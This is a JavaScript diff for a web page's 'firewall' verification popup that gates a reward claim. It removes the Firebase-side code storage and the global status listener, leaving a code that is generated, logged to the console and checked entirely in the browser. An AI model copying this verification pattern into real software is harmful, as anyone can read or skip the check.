@@ -3,39 +3,9 @@ if (typeof firebase !== 'undefined' && firebase.database) {
     db = firebase.database();
 }
 
-let firewallState = {
-    isActive: false,
-    verificationCode: null,
-    verificationAttempts: 0
-};
+let verificationCode = null;
+let attempts = 0;
 
-// Check global firewall status from Firebase
-async function checkGlobalFirewallStatus() {
-    if (!db) return false;
-    try {
-        const snap = await db.ref('admin/globalFirewall').once('value');
-        const data = snap.val();
-        firewallState.isActive = (data && data.active === true);
-        return firewallState.isActive;
-    } catch (error) {
-        console.error("Firewall check error:", error);
-        return false;
-    }
-}
-
-// Listen for real-time firewall changes
-function listenForFirewallChanges() {
-    if (!db) return;
-    db.ref('admin/globalFirewall').on('value', (snap) => {
-        const data = snap.val();
-        firewallState.isActive = (data && data.active === true);
-        if (!firewallState.isActive) {
-            hideFirewallPopup();
-        }
-    });
-}
-
-// Show firewall verification popup
 function showFirewallPopup() {
     const popup = document.getElementById('firewallPopup');
     if (popup) {
@@ -59,25 +29,13 @@ function showFirewallPopup() {
                 <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
             `;
         }
-        
-        firewallState.verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
-        firewallState.verificationAttempts = 0;
-        
-        const userPhone = localStorage.getItem("userPhone");
-        if (db && userPhone) {
-            db.ref('temp_firewall_codes/' + userPhone).set({
-                code: firewallState.verificationCode,
-                expiresAt: Date.now() + 300000,
-                createdAt: Date.now()
-            });
-        }
-        
-        console.log("📞 Verification Code:", firewallState.verificationCode);
+        verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+        attempts = 0;
+        console.log("📞 Verification Code:", verificationCode);
         popup.style.display = 'flex';
-        
         setTimeout(() => {
-            const codeInput = document.getElementById('verificationCode');
-            if (codeInput) codeInput.focus();
+            const ci = document.getElementById('verificationCode');
+            if (ci) ci.focus();
         }, 100);
     }
 }
@@ -87,7 +45,7 @@ function hideFirewallPopup() {
     if (popup) popup.style.display = 'none';
 }
 
-async function verifyFirewallCode() {
+window.verifyFirewallCode = async function() {
     const codeInput = document.getElementById('verificationCode');
     const code = codeInput ? codeInput.value.trim() : '';
     const errorDiv = document.getElementById('firewallErrorMsg');
@@ -107,84 +65,41 @@ async function verifyFirewallCode() {
     }
     if (errorDiv) errorDiv.style.display = 'none';
     
-    firewallState.verificationAttempts++;
+    attempts++;
     
-    try {
-        let isValid = (firewallState.verificationCode === code);
-        
-        const userPhone = localStorage.getItem("userPhone");
-        if (db && userPhone && !isValid) {
-            const codeSnap = await db.ref('temp_firewall_codes/' + userPhone).once('value');
-            const codeData = codeSnap.val();
-            if (codeData && codeData.expiresAt > Date.now() && codeData.code === code) {
-                isValid = true;
-                await db.ref('temp_firewall_codes/' + userPhone).remove();
+    if (code === verificationCode) {
+        hideFirewallPopup();
+        alert("Verification successful. You may now claim your reward.");
+        const withdrawBtn = document.getElementById('claimBtn');
+        if (withdrawBtn && withdrawBtn.style.display === 'block') {
+            withdrawBtn.click();
+        }
+    } else {
+        let errorMsg = "Invalid verification code. Please try again.";
+        if (attempts >= 3) {
+            errorMsg = "Too many failed attempts. Please request a new call.";
+            if (verifyBtn) {
+                verifyBtn.disabled = true;
+                verifyBtn.innerHTML = "TOO MANY ATTEMPTS";
+                setTimeout(() => {
+                    if (verifyBtn) {
+                        verifyBtn.disabled = false;
+                        verifyBtn.innerHTML = "VERIFY NOW";
+                    }
+                    attempts = 0;
+                }, 30000);
             }
         }
-        
-        if (isValid) {
-            hideFirewallPopup();
-            alert("Verification successful. You may now claim your reward.");
-            
-            const withdrawBtn = document.getElementById('claimBtn');
-            if (withdrawBtn && withdrawBtn.style.display === 'block') {
-                withdrawBtn.click();
-            }
-        } else {
-            let errorMsg = "Invalid verification code. Please try again.";
-            if (firewallState.verificationAttempts >= 3) {
-                errorMsg = "Too many failed attempts. Please request a new call.";
-                if (verifyBtn) {
-                    verifyBtn.disabled = true;
-                    verifyBtn.innerHTML = "TOO MANY ATTEMPTS";
-                    setTimeout(() => {
-                        if (verifyBtn) {
-                            verifyBtn.disabled = false;
-                            verifyBtn.innerHTML = "VERIFY NOW";
-                        }
-                        firewallState.verificationAttempts = 0;
-                    }, 30000);
-                }
-            }
-            if (errorDiv) {
-                errorDiv.innerHTML = errorMsg;
-                errorDiv.style.display = 'block';
-            }
-            if (verifyBtn && verifyBtn.disabled !== true) {
-                verifyBtn.disabled = false;
-                verifyBtn.innerHTML = "VERIFY NOW";
-            }
-        }
-    } catch (error) {
-        console.error("Verification error:", error);
         if (errorDiv) {
-            errorDiv.innerHTML = "Verification failed. Please try again.";
+            errorDiv.innerHTML = errorMsg;
             errorDiv.style.display = 'block';
         }
-        if (verifyBtn) {
+        if (verifyBtn && verifyBtn.disabled !== true) {
             verifyBtn.disabled = false;
             verifyBtn.innerHTML = "VERIFY NOW";
         }
     }
-}
-
-function initFirewall() {
-    listenForFirewallChanges();
-}
-
-// Export functions
-window.checkGlobalFirewallStatus = checkGlobalFirewallStatus;
-window.getGlobalFirewallStatus = function() {
-    return firewallState.isActive;
 };
+
 window.showFirewallPopup = showFirewallPopup;
 window.hideFirewallPopup = hideFirewallPopup;
-window.verifyFirewallCode = verifyFirewallCode;
-window.initFirewall = initFirewall;
-
-// Auto-initialize
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initFirewall);
-} else {
-    initFirewall();
-                               }
